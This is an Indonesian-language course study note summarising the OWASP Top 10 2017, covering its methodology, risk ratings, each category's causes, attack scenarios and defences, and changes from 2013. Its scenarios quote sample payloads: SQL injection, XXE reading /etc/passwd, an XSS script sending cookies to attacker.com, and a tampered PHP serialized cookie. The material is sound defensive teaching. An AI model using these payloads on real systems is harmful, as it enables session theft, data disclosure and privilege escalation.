---
type: Note
cssclasses:
  - cornell-notes
---

_Back to_ [[IF5161 Keamanan Data dan Perangkat Lunak]]

> [!cornell] OWASP Top 10 2017
>
> > ## Questions/Cues
> >
> > - Bagaimana metodologi 2017 (data submission + industry survey) dan skala datanya?
> > - Apa 10 risiko 2017 dan urutannya?
> > - Apa arti skala risiko OWASP (Exploitability / Prevalence / Detectability / Impact)?
> > - Kategori apa yang baru, digabung, dan dipensiunkan dari [[OWASP Top 10 2013]]?
> > - Contoh skenario serangan untuk XXE, XSS, dan Insecure Deserialization?
> >
> > ## Reference Points
> >
> > - IF5161 — OWASP Top 10 - 2017: The Ten Most Critical Web Application Security Risks (Release, 20 Nov 2017)
> > - IF5161 — GitHub OWASP/Top10 — `2017/OWASP-Top-10-2017-en.html`
>
> > ### Konteks & Metodologi
> >
> > **OWASP Top 10 - 2017** adalah refactor besar: metodologi dirombak, proses *data call* baru, tiap risiko ditulis ulang dari nol, dan **ditulis dalam gaya yang _testable_** agar mudah diadopsi ke program keamanan aplikasi. Dokumen menegaskan Top 10 sudah menjadi **_de facto_ standar keamanan aplikasi** (walau tujuan awalnya sekadar *raising awareness*).
> >
> > **Basis data 2017:**
> >
> > - **40+ pengiriman data** dari firma spesialis keamanan aplikasi.
> > - **_Industry survey_** yang diisi **> 500 individu** → menentukan **dua kategori baru** (A8, A10).
> > - Data mencakup kerentanan dari ratusan organisasi dan **> 100.000 aplikasi & API nyata**.
> > - Item dipilih & diprioritaskan menurut **prevalence data** dikombinasikan dengan **estimasi konsensus atas _exploitability, detectability, dan impact_**.
> > - Untuk pertama kalinya, **seluruh data kontribusi dipublikasikan** (evidence-based security).
> >
> > **Skala risiko OWASP (OWASP Risk Rating Methodology).** Tiap risiko diberi rating 1–3 pada empat sumbu, dari perspektif *"application-specific"*:
> >
> > | Sumbu | 3 | 2 | 1 |
> > |---|---|---|---|
> > | **Exploitability** | Easy | Average | Difficult |
> > | **Weakness Prevalence** | Widespread | Common | Uncommon |
> > | **Weakness Detectability** | Easy | Average | Difficult |
> > | **Technical Impact** | Severe | Moderate | Minor |
> >
> > Nama risiko diselaraskan dengan **CWE** untuk mengurangi kebingungan penamaan.
> >
> > ### Daftar OWASP Top 10 2017
> >
> > | # | Kategori | E/P/D/I | Deskripsi singkat (dari dokumen) |
> > |---|---|---|---|
> > | **A1** | Injection | 3/2/3/3 | Data tak tepercaya dikirim ke interpreter sebagai bagian perintah/query (SQL, NoSQL, OS, LDAP) |
> > | **A2** | Broken Authentication | 3/2/2/3 | Fungsi autentikasi & manajemen sesi diimplementasikan salah → kompromi password/token/identitas |
> > | **A3** | Sensitive Data Exposure | 2/3/2/3 | Data sensitif (finansial, kesehatan, PII) tak dilindungi enkripsi at rest / in transit |
> > | **A4** | XML External Entities (XXE) | 2/2/3/3 | Prosesor XML lama mengevaluasi *external entity* → baca file internal, SSRF, RCE, DoS |
> > | **A5** | Broken Access Control | 2/2/2/3 | Pembatasan hak *authenticated user* tidak ditegakkan dengan benar |
> > | **A6** | Security Misconfiguration | 3/3/3/2 | Konfigurasi default tak aman, cloud storage terbuka, header salah, pesan error verbose |
> > | **A7** | Cross-Site Scripting (XSS) | 3/3/3/2 | Data tak tepercaya masuk halaman tanpa validasi/escaping → skrip jalan di browser korban |
> > | **A8** | Insecure Deserialization | 1/2/2/3 | Deserialisasi objek berbahaya → sering RCE; juga replay, injeksi, elevasi privilege |
> > | **A9** | Using Components with Known Vulnerabilities | 2/3/2/2 | Library/framework/modul rentan berjalan dengan privilege aplikasi |
> > | **A10** | Insufficient Logging & Monitoring | 2/3/1/2 | Tanpa logging/monitoring + integrasi incident response → serangan berlanjut tak terdeteksi |
> >
> > ```mermaid
> > flowchart LR
> >     subgraph S2013["2013"]
> >         O1["A1 Injection"]
> >         O2["A2 Broken Authentication &amp; Session Mgmt"]
> >         O3["A3 XSS"]
> >         O4["A4 Insecure Direct Object References"]
> >         O5["A5 Security Misconfiguration"]
> >         O6["A6 Sensitive Data Exposure"]
> >         O7["A7 Missing Function Level Access Control"]
> >         O8["A8 CSRF"]
> >         O9["A9 Components with Known Vulnerabilities"]
> >         O10["A10 Unvalidated Redirects &amp; Forwards"]
> >     end
> >     subgraph S2017["2017"]
> >         N1["A1 Injection"]
> >         N2["A2 Broken Authentication"]
> >         N3["A3 Sensitive Data Exposure"]
> >         N4["A4 XXE (baru - data)"]
> >         N5["A5 Broken Access Control"]
> >         N6["A6 Security Misconfiguration"]
> >         N7["A7 XSS"]
> >         N8["A8 Insecure Deserialization (baru - survei)"]
> >         N9["A9 Components with Known Vulnerabilities"]
> >         N10["A10 Insufficient Logging &amp; Monitoring (baru - survei)"]
> >     end
> >     O1 --> N1
> >     O2 --> N2
> >     O6 --> N3
> >     O4 -- "merge" --> N5
> >     O7 -- "merge" --> N5
> >     O5 --> N6
> >     O3 --> N7
> >     O9 --> N9
> >     O8 -- "pensiun (5%)" --> X8["dihapus"]
> >     O10 -- "pensiun (8%)" --> X10["dihapus"]
> > ```
> >
> > ### A1 — Injection
> >
> > **Deskripsi.** *Injection flaw* (SQL, NoSQL, OS, LDAP) terjadi ketika data tak tepercaya dikirim ke interpreter sebagai bagian perintah/query; data jahat penyerang menipu interpreter untuk mengeksekusi perintah tak diinginkan atau mengakses data tanpa otorisasi. Sangat lazim di *legacy code* — ditemukan di query SQL/LDAP/XPath/NoSQL, perintah OS, parser XML, header SMTP, EL, dan query ORM. *"Review kode sumber adalah metode deteksi terbaik"*, diikuti pengujian otomatis menyeluruh atas semua parameter/header/URL/cookie/JSON/SOAP/XML. Dampak: kehilangan/korupsi/pengungkapan data, hilangnya *accountability*, penolakan akses, kadang **pengambilalihan host**.
> >
> > **Contoh Skenario Serangan.**
> >
> > 1. `String query = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") + "'";`
> > 2. Kepercayaan buta pada framework — query HQL tetap rentan: `Query HQLQuery = session.createQuery("FROM accounts WHERE custID='" + request.getParameter("id") + "'");`
> >
> > Pada keduanya penyerang mengubah `id` menjadi `' UNION SELECT SLEEP(10);--` → `http://example.com/app/accountView?id=' UNION SELECT SLEEP(10);--`. Query mengembalikan semua record tabel `accounts`; serangan lebih berbahaya bisa **mengubah/menghapus data atau memanggil stored procedure**.
> >
> > **Cara Pencegahan.** Pisahkan data dari perintah/query:
> >
> > - Pilihan utama: **safe API / parameterized interface**, atau migrasi ke **ORM**. Catatan: *stored procedure* pun bisa injeksi jika PL/SQL / T-SQL mengonkatenasi query & data atau memakai `EXECUTE IMMEDIATE`/`exec()`.
> > - **Validasi input positif ("whitelist") sisi server** — bukan pertahanan lengkap.
> > - **Escape karakter khusus** untuk sisa query dinamis. Nama tabel/kolom SQL **tidak bisa di-escape** — nama struktur dari input pengguna berbahaya.
> > - Pakai **`LIMIT`** & kontrol SQL lain untuk mencegah pengungkapan record massal.
> >
> > ### A2 — Broken Authentication
> >
> > **Deskripsi.** Fungsi autentikasi & manajemen sesi sering salah implementasi → penyerang mengompromikan password/kunci/token sesi atau mengambil identitas pengguna lain (sementara/permanen). Penyerang punya **ratusan juta kombinasi username/password valid** untuk *credential stuffing*, ditambah daftar akun admin default dan alat brute force. Lemah bila aplikasi:
> >
> > - Membiarkan **credential stuffing** dan **brute force / serangan otomatis**.
> > - Menerima **password default/lemah/umum** ("Password1", "admin/admin").
> > - Pemulihan kredensial lemah — *"knowledge-based answers"* yang tak bisa diamankan.
> > - Menyimpan password **plain text, terenkripsi, atau hash lemah** (lih. A3).
> > - **MFA** hilang atau tidak efektif.
> > - **Session ID di URL** (URL rewriting).
> > - **Tidak me-rotasi session ID** setelah login sukses.
> > - **Tidak menginvalidasi session ID** dengan benar — sesi / token SSO tidak dibatalkan saat logout / idle.
> >
> > **Contoh Skenario Serangan.**
> >
> > 1. **Credential stuffing** — tanpa proteksi *automated threat*, aplikasi jadi **password oracle** untuk menguji validitas kredensial.
> > 2. Sebagian besar serangan autentikasi terjadi karena **password sebagai satu-satunya faktor**. Rotasi & kompleksitas wajib justru mendorong password lemah & dipakai ulang — NIST 800-63 menyarankan menghentikannya dan memakai **MFA**.
> > 3. **Timeout sesi tidak diset benar** — user di komputer publik hanya menutup tab (bukan "logout"). Satu jam kemudian penyerang memakai browser yang sama; user **masih terautentikasi**.
> >
> > **Cara Pencegahan.**
> >
> > - **MFA** sedapat mungkin.
> > - Jangan kirim/deploy dengan **kredensial default**, terutama admin.
> > - **Cek password lemah** terhadap daftar 10.000 password terburuk.
> > - Kebijakan panjang/kompleksitas/rotasi password ikut **NIST 800-63B §5.1.1** (Memorized Secrets).
> > - Perkuat registrasi/pemulihan/API terhadap **enumerasi akun** — pesan seragam.
> > - **Batasi / perlambat login gagal**; log semua kegagalan & alert saat serangan terdeteksi.
> > - **Session manager sisi server** — ID acak entropi tinggi setelah login; tidak di URL; disimpan aman; diinvalidasi setelah logout, idle, dan *absolute timeout*.
> >
> > ### A3 — Sensitive Data Exposure
> >
> > **Deskripsi.** Banyak aplikasi/API tak melindungi data sensitif (finansial, kesehatan, PII); penyerang mencuri/mengubahnya untuk penipuan kartu kredit, pencurian identitas, dll. *"Penyerang biasanya tidak membobol kripto secara langsung"* — mereka mencuri kunci, melakukan MITM, atau mencuri *clear text* dari server/transit/klien. Cacat paling umum: **tidak mengenkripsi data sensitif** sama sekali; bila kripto dipakai, sering lemah dalam *key generation/management*, algoritma, protokol, dan **penyimpanan hash password**. Langkah pertama: tentukan kebutuhan proteksi data in transit & at rest (GDPR, PCI DSS). Periksa:
> >
> > - Ada data dikirim *clear text* (HTTP, SMTP, FTP)? Trafik internal (load balancer ↔ web server ↔ back-end) juga.
> > - Algoritma kripto **lama/lemah** dipakai (default atau di kode lama)?
> > - Kunci **default / lemah / dipakai ulang**; manajemen & rotasi kunci hilang?
> > - Enkripsi tidak dipaksakan; *security directive/header* browser hilang?
> > - *User agent* tidak memverifikasi validitas sertifikat server?
> >
> > **Contoh Skenario Serangan.**
> >
> > 1. Aplikasi mengenkripsi nomor kartu kredit dengan **enkripsi database otomatis**, tetapi data **otomatis di-dekripsi** saat diambil → celah **SQL injection** mengembalikannya dalam *clear text*.
> > 2. Situs tak memaksa TLS / mendukung enkripsi lemah. Penyerang di Wi-Fi publik **men-*downgrade* HTTPS → HTTP**, mencuri *session cookie*, membajak sesi, atau mengubah data (mis. penerima transfer uang).
> > 3. Database password memakai hash **tanpa salt** / sederhana. Celah *file upload* → penyerang mengambil database; hash tanpa salt dibongkar *rainbow table*, hash cepat dibongkar GPU meski di-salt.
> >
> > **Cara Pencegahan.**
> >
> > - **Klasifikasikan** data; terapkan kontrol sesuai klasifikasi.
> > - Jangan simpan data sensitif yang tak perlu — buang cepat atau **tokenisasi/truncation** sesuai PCI DSS. *"Data yang tidak disimpan tidak bisa dicuri."*
> > - **Enkripsi semua data sensitif at rest**; enkripsi data in transit dengan **TLS + PFS**, prioritas cipher di sisi server; paksa **HSTS**.
> > - Algoritma/protokol/kunci **mutakhir & kuat**; manajemen kunci benar.
> > - **Nonaktifkan caching** untuk respons berdata sensitif.
> > - Simpan password dengan **hash adaptif ber-salt + work factor** — Argon2, scrypt, bcrypt, PBKDF2.
> > - Verifikasi efektivitas konfigurasi secara independen.
> >
> > ### A4 — XML External Entities (XXE)
> >
> > **Deskripsi.** **Kategori baru 2017** (didukung terutama data alat **SAST**). Prosesor XML lama/salah konfigurasi mengevaluasi *external entity* — URI yang di-*dereference* saat *parsing*. Penyerang bisa **membaca file internal** (via `file://`), mengakses *file share* internal, **port scanning internal**, **RCE**, dan **DoS**. Rentan bila:
> >
> > - Aplikasi menerima **XML langsung / unggahan XML**, terutama dari sumber tak tepercaya, atau menyisipkan data tak tepercaya ke dokumen XML yang lalu di-*parse*.
> > - **DTD aktif** di salah satu prosesor XML / *SOAP web service*.
> > - Aplikasi memakai **SAML** untuk *identity* (SAML memakai XML untuk *assertion*).
> > - Aplikasi memakai **SOAP < 1.2** dengan *entity* XML.
> > - Rentan XXE → kemungkinan rentan **DoS "Billion Laughs"**.
> >
> > **Contoh Skenario Serangan.**
> >
> > 1. Penyerang mengekstrak data server:
> >    `<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>`
> > 2. Penyerang **menyelidiki jaringan internal** dengan mengganti baris ENTITY: `<!ENTITY xxe SYSTEM "https://192.168.1.1/private" >]>`
> > 3. Penyerang mencoba **DoS** dengan file tak berujung: `<!ENTITY xxe SYSTEM "file:///dev/random" >]>`
> >
> > **Cara Pencegahan.** Pelatihan developer esensial. Selain itu:
> >
> > - Gunakan **format lebih sederhana (JSON)** bila memungkinkan; hindari serialisasi data sensitif.
> > - **Patch/upgrade** semua prosesor & library XML; upgrade **SOAP ≥ 1.2**.
> > - **Nonaktifkan _external entity_ & pemrosesan DTD** di semua parser XML (lih. OWASP Cheat Sheet 'XXE Prevention').
> > - **Validasi input positif ("whitelisting") sisi server**; validasi unggahan XML/XSL dengan **XSD**.
> > - **SAST** membantu deteksi; *code review* manual terbaik untuk aplikasi besar & kompleks.
> > - Bila kontrol di atas tak memungkinkan: **virtual patching, API security gateway, atau WAF**.
> >
> > ### A5 — Broken Access Control
> >
> > **Deskripsi.** Pembatasan atas apa yang boleh dilakukan *authenticated user* sering tak ditegakkan. **Menggabungkan** A4:2013 *Insecure Direct Object References* dan A7:2013 *Missing Function Level Access Control*. *"Eksploitasi kontrol akses adalah keterampilan inti penyerang."* SAST/DAST bisa mendeteksi *ketiadaan* kontrol tetapi tak bisa memverifikasi *fungsionalitasnya* — **pengujian manual adalah cara terbaik**. Kerentanan umum:
> >
> > - Melewati pengecekan dengan **memodifikasi URL, _state_ internal, halaman HTML, atau memakai alat serang API**.
> > - Mengubah **primary key** ke record user lain → melihat/menyunting akun orang lain.
> > - **Elevasi privilege** — bertindak sebagai user tanpa login, atau sebagai admin sebagai user biasa.
> > - **Manipulasi metadata** — replay/tamper **JWT**, cookie, atau *hidden field*; menyalahgunakan invalidasi JWT.
> > - **CORS salah konfigurasi** → akses API tak berwenang.
> > - **Force browsing** ke halaman *authenticated* / *privileged*; API tanpa kontrol untuk **POST, PUT, DELETE**.
> >
> > **Contoh Skenario Serangan.**
> >
> > 1. Aplikasi memakai data tak terverifikasi di SQL: `pstmt.setString(1, request.getParameter("acct")); ResultSet results = pstmt.executeQuery();` Penyerang mengubah parameter `acct` di browser: `http://example.com/app/accountInfo?acct=notmyacct`.
> > 2. Penyerang **force browse** ke URL target. `http://example.com/app/getappInfo` dan `http://example.com/app/admin_getappInfo` — *"Jika user tak terautentikasi bisa mengakses salah satu, itu cacat. Jika non-admin bisa mengakses halaman admin, itu cacat."*
> >
> > **Cara Pencegahan.** Kontrol akses hanya efektif bila **ditegakkan di kode sisi server / serverless API yang tepercaya**.
> >
> > - **Deny by default** kecuali sumber daya publik.
> > - Implementasi kontrol akses **sekali, dipakai ulang**; minimalkan CORS.
> > - Tegakkan **kepemilikan record**; batasan bisnis unik lewat *domain model*.
> > - Nonaktifkan *directory listing*; pastikan **file metadata (`.git`) & backup** tidak ada di web root.
> > - **Log** kegagalan kontrol akses + alert admin bila berulang.
> > - **Rate limit** API/controller.
> > - **Invalidasi JWT di server** setelah logout.
> > - Developer & QA menyertakan **unit & integration test kontrol akses fungsional**.
> >
> > ### A6 — Security Misconfiguration
> >
> > **Deskripsi.** *"Isu yang paling umum terlihat."* Akibat konfigurasi default tak aman, konfigurasi ad-hoc/tak lengkap, **cloud storage terbuka**, header HTTP salah, dan **pesan error verbose**. Bisa terjadi di **level mana pun** — layanan jaringan, platform, web server, app server, database, framework, kode kustom, VM/kontainer/storage pra-instal. Rentan bila:
> >
> > - **Hardening kurang** di suatu bagian stack, atau **izin cloud service** keliru.
> > - **Fitur tak perlu** aktif (port, service, halaman, akun, privilege).
> > - **Akun & password default** masih aktif.
> > - **Pesan error** membocorkan *stack trace* / info berlebihan.
> > - Sistem yang di-upgrade: fitur keamanan terbaru **dinonaktifkan / tak dikonfigurasi aman**.
> > - Setelan keamanan di app server/framework (Struts, Spring, ASP.NET)/library/database **tidak aman**.
> > - **Security header/directive** tidak dikirim atau tak aman.
> > - Software **usang atau rentan** (lih. A9).
> >
> > **Contoh Skenario Serangan.**
> >
> > 1. **Aplikasi contoh** tak dihapus dari server produksi; salah satunya konsol admin dengan **akun default** → penyerang login dan mengambil alih.
> > 2. **Directory listing aktif** → penyerang meng-*list* direktori, mengunduh kelas Java terkompilasi, men-*decompile*, dan menemukan celah kontrol akses serius.
> > 3. Konfigurasi server mengembalikan **pesan error detail (stack trace)** → membocorkan info sensitif / versi komponen yang rentan.
> > 4. **CSP** dengan izin berbagi default **terbuka ke internet** → data sensitif di cloud storage diakses.
> >
> > **Cara Pencegahan.**
> >
> > - **Proses hardening yang dapat diulang & terotomasi**; dev/QA/prod dikonfigurasi identik, kredensial berbeda.
> > - **Platform minimalis** — tanpa fitur/komponen/dokumentasi/sampel yang tak dipakai.
> > - **Review & update konfigurasi** sebagai bagian *patch management* (termasuk izin S3/cloud storage).
> > - **Arsitektur tersegmentasi** — segmentasi, kontainerisasi, atau *cloud security groups (ACL)*.
> > - Kirim **security header** ke klien.
> > - **Proses otomatis** memverifikasi efektivitas konfigurasi di semua environment.
> >
> > ### A7 — Cross-Site Scripting (XSS)
> >
> > **Deskripsi.** Terjadi ketika aplikasi/API memasukkan data tak tepercaya ke halaman web tanpa validasi/escaping, atau memperbarui halaman dengan data pengguna lewat *browser API* yang bisa membuat HTML/JS. **Isu #2 paling prevalen**, ada di ± dua pertiga aplikasi. Tiga bentuk:
> >
> > - **Reflected XSS** — input tak divalidasi/tak di-escape dikembalikan sebagai bagian output HTML; korban perlu berinteraksi dengan tautan jahat.
> > - **Stored XSS** — input tak disanitasi disimpan, lalu dilihat pengguna/admin lain. Sering dinilai risiko tinggi/kritis.
> > - **DOM XSS** — framework JS / SPA / API menyisipkan data terkendali-penyerang ke halaman secara dinamis.
> >
> > Dampak khas: pencurian sesi, *account takeover*, *MFA bypass*, penggantian/*defacement* node DOM (mis. panel login trojan), unduhan malware, *keylogging*.
> >
> > **Contoh Skenario Serangan.**
> >
> > 1. Aplikasi memakai data tak tepercaya tanpa validasi/escaping: `(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";` Penyerang mengubah parameter `CC` menjadi `'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'` → session ID korban dikirim ke situs penyerang → sesi dibajak.
> >
> > Catatan: penyerang bisa memakai XSS untuk mengalahkan pertahanan **CSRF** otomatis apa pun.
> >
> > **Cara Pencegahan.** Pisahkan data tak tepercaya dari konten browser aktif:
> >
> > - **Framework yang auto-escape by design** (Rails terbaru, React JS) — pelajari batasannya.
> > - **Escape data request HTTP tak tepercaya berdasarkan konteks** output HTML (body, atribut, JavaScript, CSS, URL) → menuntaskan Reflected & Stored XSS.
> > - **Context-sensitive encoding** saat memodifikasi dokumen di sisi klien → melawan DOM XSS.
> > - Aktifkan **Content Security Policy (CSP)** sebagai *defense-in-depth*.
> >
> > ### A8 — Insecure Deserialization
> >
> > **Deskripsi.** **Kategori baru 2017 dari _industry survey_** (bukan data kuantitatif). Deserialisasi tak aman sering menghasilkan **RCE** — salah satu serangan paling serius; bahkan tanpa RCE bisa dipakai untuk *replay*, injeksi, dan **elevasi privilege**. Rentan bila aplikasi/API men-*deserialize* objek berbahaya/di-*tamper* dari penyerang. Dua tipe serangan: (a) **objek/struktur data** — mengubah logika aplikasi atau RCE bila ada kelas yang bisa mengubah perilaku saat/setelah deserialisasi; (b) **tampering data** — struktur tetap, isi diubah (mis. serangan kontrol akses). Serialisasi dipakai di RPC/IPC, *wire protocol*, *web service*, *message broker*, caching/persistence, DB, cookie HTTP, parameter form, token API.
> >
> > **Contoh Skenario Serangan.**
> >
> > 1. Aplikasi React memanggil microservice Spring Boot. *User state* di-*serialize* & dikirim bolak-balik tiap request. Penyerang melihat tanda objek Java **`rO0`** (base64), memakai **Java Serial Killer** → **RCE** di server aplikasi.
> > 2. Forum PHP memakai serialisasi objek PHP untuk *"super cookie"* berisi user ID, role, hash password:
> >    `a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user";i:3;s:32:"...";}`
> >    Penyerang mengubahnya untuk memberi diri hak admin:
> >    `a:4:{i:0;i:1;i:1;s:5:"Alice";i:2;s:5:"admin";i:3;s:32:"...";}`
> >
> > **Cara Pencegahan.** Pola aman satu-satunya: **jangan menerima objek serialized dari sumber tak tepercaya**, atau pakai medium yang hanya mengizinkan **tipe data primitif**. Bila tak mungkin:
> >
> > - **Integrity check / tanda tangan digital** pada objek serialized.
> > - **Batasan tipe ketat** saat deserialisasi (bisa di-*bypass*, jangan diandalkan sendiri).
> > - **Isolasi & jalankan kode deserialisasi di lingkungan privilege rendah**.
> > - **Log eksepsi & kegagalan deserialisasi**; monitor & alert bila user men-*deserialize* terus-menerus.
> > - **Batasi/monitor konektivitas jaringan** dari kontainer/server yang men-*deserialize*.
> >
> > ### A9 — Using Components with Known Vulnerabilities
> >
> > **Deskripsi.** Komponen (library, framework, modul) berjalan dengan **privilege yang sama seperti aplikasi** → celah di komponen bisa menyebabkan kehilangan data serius / pengambilalihan server. Prevalensi **sangat luas**: pola pengembangan *component-heavy* membuat tim tak tahu komponen apa yang dipakai, apalagi memperbaruinya. Kemungkinan rentan bila:
> >
> > - **Tidak tahu versi** semua komponen (klien & server), termasuk **dependensi bersarang**.
> > - Software **rentan / tak didukung / usang** (OS, web/app server, DBMS, aplikasi, API, runtime, library).
> > - **Tidak rutin memindai** kerentanan & tak berlangganan *security bulletin*.
> > - **Tidak patch/upgrade** platform/framework/dependensi tepat waktu berbasis risiko (patch bulanan/kuartalan → berhari/berbulan terekspos).
> > - **Tidak menguji kompatibilitas** library yang di-*update*.
> > - **Tidak mengamankan konfigurasi** komponen (lih. A6).
> >
> > **Contoh Skenario Serangan.**
> >
> > 1. **CVE-2017-5638** (Apache Struts 2 RCE) *"memungkinkan eksekusi kode arbitrer di server"* dan disalahkan atas kebocoran besar. **IoT & perangkat biomedis** sulit/mustahil di-patch meski penting. Alat seperti **Shodan** membantu menemukan perangkat yang masih rentan **Heartbleed** (di-patch April 2014).
> >
> > **Cara Pencegahan.** *Patch management process*:
> >
> > - Hapus **dependensi & fitur tak terpakai**.
> > - **Inventaris versi** komponen klien & server terus-menerus — `versions`, **DependencyCheck**, **retire.js**.
> > - **Pantau CVE & NVD**; pakai **Software Composition Analysis (SCA)**; berlangganan alert.
> > - Ambil komponen **hanya dari sumber resmi lewat link aman**; **utamakan paket bertanda tangan**.
> > - Pantau **library tak terpelihara**; jika tak bisa patch → **virtual patch**.
> > - Rencana berkelanjutan untuk memantau, memilah, & menerapkan update sepanjang umur aplikasi.
> >
> > ### A10 — Insufficient Logging & Monitoring
> >
> > **Deskripsi.** **Kategori baru 2017 dari _industry survey_**. *Insufficient logging & monitoring* + integrasi *incident response* yang hilang/tak efektif membiarkan penyerang **melanjutkan serangan, mempertahankan persistensi, berpindah sistem, dan meng-*tamper*/ekstrak/menghancurkan data**. Studi kebocoran menunjukkan **waktu deteksi > 200 hari** (2016: rata-rata 191 hari), umumnya oleh **pihak eksternal**. Rentan kapan pun:
> >
> > - Event auditable (login, login gagal, transaksi bernilai tinggi) **tidak dicatat**.
> > - Warning & error menghasilkan log **tidak ada / tidak memadai / tidak jelas**.
> > - Log aplikasi & API **tidak dimonitor** untuk aktivitas mencurigakan.
> > - Log **hanya disimpan lokal**.
> > - **Ambang alert & proses eskalasi** tidak ada / tidak efektif.
> > - Pentest & pemindaian DAST (mis. OWASP ZAP) **tidak memicu alert**.
> > - Aplikasi tak bisa **mendeteksi/eskalasi/alert serangan aktif** real-time.
> > - **Kebocoran informasi** bila event logging/alert terlihat oleh pengguna/penyerang (lih. A3).
> >
> > **Contoh Skenario Serangan.**
> >
> > 1. **Software forum open-source** dijalankan tim kecil dibobol lewat celah; penyerang **menghapus repo kode sumber** versi berikutnya dan seluruh isi forum. Kurangnya monitoring/logging/alerting membuat kebocoran jauh lebih parah — proyek forum **berhenti** akibat insiden ini.
> > 2. Penyerang **memindai user dengan password umum** → mengambil alih semua akun berpassword itu; untuk user lain hanya meninggalkan satu login gagal. Beberapa hari kemudian diulang dengan password berbeda.
> > 3. **Retailer besar AS** punya *sandbox* analisis malware yang **mendeteksi** software berbahaya, tetapi **tak ada yang merespons**; sandbox mengeluarkan warning cukup lama sebelum kebocoran terdeteksi lewat transaksi kartu penipuan oleh bank eksternal.
> >
> > **Cara Pencegahan.** Sesuai risiko data:
> >
> > - Pastikan kegagalan **login, kontrol akses, validasi input sisi server** dapat dicatat dengan **konteks pengguna** cukup; disimpan cukup lama untuk forensik.
> > - Log dalam **format yang mudah dikonsumsi** solusi manajemen log terpusat.
> > - Transaksi bernilai tinggi punya **audit trail dengan kontrol integritas** (mis. *append-only table*).
> > - **Monitoring & alerting efektif** — aktivitas mencurigakan terdeteksi & direspons cepat.
> > - **Adopsi rencana incident response & recovery** — NIST 800-61 rev 2 atau lebih baru.
> > - Alat: **OWASP AppSensor**, **ModSecurity + OWASP CRS**, software korelasi log.
> >
> > ### Perubahan dari Edisi 2013
> >
> > - **Baru, didukung data:** **A4:2017 XXE** (terutama dari dataset SAST).
> > - **Baru, didukung komunitas (survei > 500 orang):** **A8 Insecure Deserialization**, **A10 Insufficient Logging & Monitoring**.
> > - **Digabung:** A4:2013 *Insecure Direct Object References* **+** A7:2013 *Missing Function Level Access Control* → **A5:2017 Broken Access Control**.
> > - **Dipensiunkan:** **A8:2013 CSRF** (banyak framework sudah punya pertahanan bawaan; ditemukan hanya di 5% aplikasi); **A10:2013 Unvalidated Redirects and Forwards** (± 8% aplikasi, tetapi kalah dari XXE).
> > - Metodologi & penulisan tiap risiko dirombak total dan dibuat *testable*.

> [!cornell] #### Summary
>
> **OWASP Top 10 - 2017** adalah refactor besar berbasis **40+ pengiriman data** + **industry survey > 500 orang** atas **> 100.000 aplikasi & API nyata**, dengan tiap risiko ditulis ulang secara *testable* dan diberi **skala risiko OWASP** (Exploitability / Prevalence / Detectability / Impact). **Injection** tetap **#1**. Tiga kategori **baru**: **A4 XXE** (dari data SAST), serta **A8 Insecure Deserialization** dan **A10 Insufficient Logging & Monitoring** (dari survei komunitas). **A5 Broken Access Control** kini menggabungkan *Insecure Direct Object References* + *Missing Function Level Access Control*. **CSRF** (hanya 5% aplikasi) dan **Unvalidated Redirects and Forwards** **dipensiunkan**. Edisi ini adalah dasar langsung bagi [[OWASP Top 10 2021]] — yang kemudian melebur XXE ke Security Misconfiguration, XSS ke Injection, dan Insecure Deserialization ke Software and Data Integrity Failures. Lihat akarnya di [[OWASP Top 10 2013]].

> [!ad-libitum]- Additional Information
>
> #### Nasib kategori 2017 di edisi berikutnya (konteks tambahan, bukan dari dokumen 2017)
>
> | 2017 | 2021 |
> |---|---|
> | A4 XXE | Melebur ke A05 Security Misconfiguration |
> | A7 XSS | Melebur ke A03 Injection |
> | A8 Insecure Deserialization | Melebur ke A08 Software and Data Integrity Failures |
> | A5 Broken Access Control | Naik ke A01 |
> | A2 Broken Authentication | Ganti nama → Identification and Authentication Failures (A07) |
> | A3 Sensitive Data Exposure | Ganti nama → Cryptographic Failures (A02) |
> | A9 Components with Known Vulnerabilities | Ganti nama → Vulnerable and Outdated Components (A06) |
> | A10 Insufficient Logging & Monitoring | Ganti nama → Security Logging and Monitoring Failures (A09) |
>
> #### "Testable style" — kenapa penting
>
> Sejak 2017, tiap risiko punya struktur tetap: **Threat agents/Attack vectors → Security Weakness → Impacts**, lalu **_Is the Application Vulnerable?_ → _How To Prevent_ → _Example Attack Scenarios_ → References (OWASP + CWE)**. Struktur ini memudahkan memetakan tiap poin ke *test case* di pipeline CI/CD (SAST/DAST).
>
> #### Proyek Eksplorasi Mandiri
>
> 1. Ambil aplikasi rentan latihan (mis. OWASP **Juice Shop** / **WebGoat**) dan reproduksi satu skenario dari tiap kategori 2017.
> 2. Petakan tiap risiko 2017 ke CWE-nya (CWE-89, CWE-79, CWE-611, CWE-502, dst.) dan bandingkan dengan pemetaan CWE di [[OWASP Top 10 2021]].
> 3. Uji XXE pada parser XML default beberapa bahasa (Java `DocumentBuilderFactory`, Python `lxml`) di lab pribadi — amati mana yang aman *by default*.
>
> #### Bacaan Lanjutan
>
> - OWASP Top 10-2017 (PDF/PPTX resmi) — GitHub `OWASP/Top10/2017/`.
> - OWASP Proactive Controls, OWASP ASVS, OWASP Testing Guide, OWASP Cheat Sheet Series.
> - NIST 800-63B (autentikasi), NIST 800-61r2 (incident response), CIS Benchmarks (hardening).
